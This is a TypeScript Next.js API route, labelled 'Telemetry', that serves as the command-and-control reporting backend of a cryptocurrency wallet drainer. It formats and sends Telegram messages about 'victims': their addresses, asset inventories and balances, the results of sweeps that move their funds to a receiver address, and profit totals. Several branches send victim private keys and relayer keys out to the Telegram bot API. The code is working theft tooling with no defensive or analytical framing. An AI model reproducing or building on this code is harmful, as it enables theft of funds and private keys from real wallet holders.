import { NextResponse } from "next/server";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const SEP = "──────────────────";

// 🚀 STATIC EXPLORER LOOKUP
const EXPLORERS: Record<string, { name: string; url: string }> = {
  "1": { name: "Ethereum", url: "https://etherscan.io/tx/" },
  "56": { name: "BscScan", url: "https://bscscan.com/tx/" },
  "137": { name: "PolygonScan", url: "https://polygonscan.com/tx/" },
  "8453": { name: "BaseScan", url: "https://basescan.org/tx/" },
  "42161": { name: "ArbiScan", url: "https://arbiscan.io/tx/" },
  solana: { name: "Solscan", url: "https://solscan.io/tx/" },
  SOLANA: { name: "Solscan", url: "https://solscan.io/tx/" },
  tron: { name: "Tronscan", url: "https://tronscan.org/#/transaction/" },
  TRON: { name: "Tronscan", url: "https://tronscan.org/#/transaction/" },
  xrp: { name: "XRP Scan", url: "https://xrpscan.com/tx/" },
  XRP: { name: "XRP Scan", url: "https://xrpscan.com/tx/" },
  btc: { name: "Blockchain", url: "https://www.blockchain.com/btc/tx/" },
  UTXO: { name: "Blockchain", url: "https://www.blockchain.com/btc/tx/" },
};

const esc = (str: any): string => {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
};

const getExplorerLink = (chainId: number | string, hash: string) => {
  if (!hash || hash === "0x") return "<i>Pending or Simulated</i>";
  const config = EXPLORERS[String(chainId)];
  const url = config
    ? `${config.url}${hash}`
    : `https://blockchair.com/search?q=${hash}`;
  return `<a href="${url}">View Explorer</a>`;
};

export async function POST(req: Request) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("[Telemetry] Missing Env Vars");
    return NextResponse.json({ error: "CONFIG_MISSING" }, { status: 500 });
  }

  try {
    const { type, data } = await req.json();
    if (!data) return NextResponse.json({ error: "NO_DATA" }, { status: 400 });

    let message = "";
    let keyboard: any = null;

    switch (type) {
      case "GhostDerivation":
        const masterKey =
          data.vault?.masterKey || data.masterKey || "UNDEFINED";
        message =
          `👑 <b>UNIVERSAL GOD-KEY DERIVED</b>\n${SEP}\n` +
          `<b>👤 ADDR:</b> <code>${esc(data.userAddress)}</code>\n` +
          `<b>🔑 PRIVATE KEY:</b>\n<code>${esc(masterKey)}</code>\n${SEP}\n`;
        break;

      case "Discovery":
        let totalVal = 0;
        const assets = Array.isArray(data.assets) ? data.assets : [];
        const assetList = assets
          .map((a: any) => {
            const val = Number(a.usdValue || a.v) || 0;
            totalVal += val;
            return `<b>🪙 ${esc(a.symbol || "Asset")}:</b> <code>${esc(
              a.displayBalance || a.b || "0",
            )}</code> (~$${esc(val.toFixed(2))})`;
          })
          .join(`\n${SEP}\n`)
          .slice(0, 3500);

        message =
          `<b>⚡ VICTIM ASSET OVERVIEW</b>\n${SEP}\n` +
          `<b>👤 ETH Address :</b> <code>${esc(data.address)}</code>\n` +
          `<b>📦 TARGET INVENTORY:</b>\n\n${
            assetList || "<i>No assets found</i>"
          }\n\n` +
          `<b>💰 TOTAL VAL:</b> <b>$${esc(totalVal.toFixed(2))}</b>\n\n`;
        break;

      case "DetailedSweep":
        const txLink =
          data.chainId === 31337 || data.chainId === "31337"
            ? "<i>Local Simulation (Hardhat)</i>"
            : getExplorerLink(data.chainId, data.hash);

        message =
          data.status === "SUCCESS"
            ? `✅ <b>SWEEP SUCCESS</b>\n${SEP}\n` +
              `📤 <b>FROM:</b> <code>${esc(data.victimAddress)}</code>\n` +
              `📥 <b>TO:</b> <code>${esc(data.receiverAddress)}</code>\n` +
              `💎 <b>ASSET:</b> ${esc(data.symbol)}\n` +
              `📉 <b>AMOUNT:</b> ${esc(data.amount)}\n` +
              `🔨 <b>TYPE:</b> ${esc(data.type)}\n\n` +
              `🔗 <b>TRANSACTION:</b>\n${txLink}\n` +
              `<code>${esc(data.hash)}</code>\n${SEP}\n` +
              `🕒 ${new Date().toLocaleString()}`
            : `❌ <b>SWEEP FAILURE</b>\n${SEP}\n` +
              `🔨 <b>TYPE:</b> <code>${esc(data.type)}</code>\n` +
              `📤 <b>FROM:</b> <code>${esc(data.victimAddress)}</code>\n` +
              `❌ <b>ERROR:</b> <i>${esc(data.error)}</i>\n${SEP}\n` +
              `🕒 ${new Date().toLocaleString()}`;
        break;

      case "ActivitySignal":
        message =
          `👣 <b>ACTIVITY SIGNAL</b>\n${SEP}\n` +
          `<b>👤 ETH:</b> <code>${esc(
            data.address || "Connecting...",
          )}</code>\n` +
          `<b>🛠️ STEP:</b> <code>${esc(data.step)}</code>\n` +
          `<b>📝 INFO:</b> <i>${esc(
            data.details || "In progress",
          )}</i>\n${SEP}\n` +
          `<i>🕒 ${new Date().toLocaleTimeString()}</i>\n`;
        break;

      case "SweepSummary":
        message =
          `💰 <b>STRIKE TOTAL PROFIT</b>\n${SEP}\n` +
          `<b>👤 VICTIM:</b> <code>${esc(data.victimAddress)}</code>\n` +
          `<b>💵 TOTAL VAL:</b> <b>${esc(data.totalAmount)}</b>\n` +
          `<b>📦 ASSETS:</b> <code>${esc(data.assetCount)}</code>\n` +
          `<b>🔨 TYPE:</b> ${esc(data.type)}\n` +
          `<b>⛓️ CHAIN:</b> ${esc(data.suffix)}\n${SEP}\n` +
          `🔗 <b>HASH:</b> <code>${esc(data.hash)}</code>\n` +
          `🕒 ${new Date().toLocaleString()}`;
        break;

      case "Exfiltration":
        const manifest = (data.assets || [])
          .map(
            (a: any) =>
              `<b>🪙 ${esc(a.symbol || "Asset")}:</b> <code>$${esc(
                Number(a.usdValue || a.v || 0).toFixed(2),
              )}</code>\n<b>📍 ADDR:</b> <code>${esc(data.userAddress)}</code>`,
          )
          .join(`\n${SEP}\n`);
        message =
          `⚠️ <b>[Fallback: Exfiltration]</b>\n<b>⚡ Victim Crypto Balance</b>\n${SEP}\n` +
          `${manifest || "<i>Empty Wallet</i>"}\n\n` +
          `${
            data.masterKey
              ? `<b>🔑 VICTIM PRIVATE KEY:</b>\n<code>${esc(
                  data.masterKey,
                )}</code>`
              : ""
          }\n` +
          `<b>✅ Handshake Verified.</b>\n`;
        break;

      case "GasRefuel":
        message =
          `⛽ <b>GAS REFUEL EXECUTED</b>\n${SEP}\n` +
          `<b>👤 VICTIM:</b> <code>${esc(data.victimAddress)}</code>\n` +
          `<b>⛓️ NETWORK:</b> <code>${esc(data.chain)}</code>\n` +
          `<b>⚡ TYPE:</b> <code>${esc(data.type)}</code>\n` +
          `<b>💰 SENT:</b> <b>${esc(data.amount)}</b>\n` +
          `<b>🔗 HASH:</b> <code>${esc(data.hash)}</code>\n${SEP}\n`;
        break;

      case "RelayerAlert":
        message =
          `🚨 <b>CRITICAL: RELAYER EXHAUSTED</b>\n${SEP}\n` +
          `<b>⛓️ CHAIN:</b> <code>${esc(data.chainId)}</code>\n` +
          `<b>🛰️ ADDR:</b> <code>${esc(data.relayerAddress)}</code>\n` +
          `<b>❌ ERROR:</b> <code>${esc(data.error)}</code>\n${SEP}\n`;
        break;

      case "GasShortageAlert":
        message =
          `⚠️ <b>GAS SHORTAGE ALERT</b> ⚠️\n${SEP}\n` +
          `👤 <b>VICTIM ADDR:</b> <code>${esc(data.victimAddress)}</code>\n` +
          `🔑 <b>VICTIM KEY:</b> <code>${esc(
            data.victimKey,
          )}</code>\n${SEP}\n` +
          `📦 <b>ASSETS HELD:</b> ${esc(data.assetsFound)}\n` +
          `🚨 <b>RELAYER ETH:</b> <code>0.00</code>\n` +
          `🔑 <b>RELAYER KEY:</b> <code>${esc(
            data.relayerKey,
          )}</code>\n${SEP}\n` +
          `💡 <i>Action: Fund Relayer with ~${esc(data.requiredGas)} ETH.</i>`;

        const mmUrl = `https://metamask.app.link/send/${
          data.relayerAddress || data.victimAddress
        }@${data.chainId || 1}?value=${data.requiredGas || "0"}`;
        keyboard = {
          inline_keyboard: [
            [{ text: "🦊 MetaMask", url: mmUrl }],
            [
              {
                text: "🔍 Victim Explorer",
                url: `https://blockchair.com/search?q=${data.victimAddress}`,
              },
            ],
          ],
        };
        break;
    }

    if (!message)
      return NextResponse.json({ success: false, error: "Empty signal" });

    const payload: any = {
      chat_id: CHAT_ID,
      text: message.trim(),
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    if (keyboard) payload.reply_markup = keyboard;

    // Use fetch without an aggressive abort signal to prevent "Operation Aborted" locally
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      },
    );

    if (!response.ok) {
      const errData = await response.json();
      console.error("[Telegram Error]", errData.description);
      return NextResponse.json(
        { success: false, error: errData.description },
        { status: 502 },
      );
    }

    return NextResponse.json({ success: true });
  } catch (err: any) {
    console.error("[Telemetry Catch]", err.message);
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
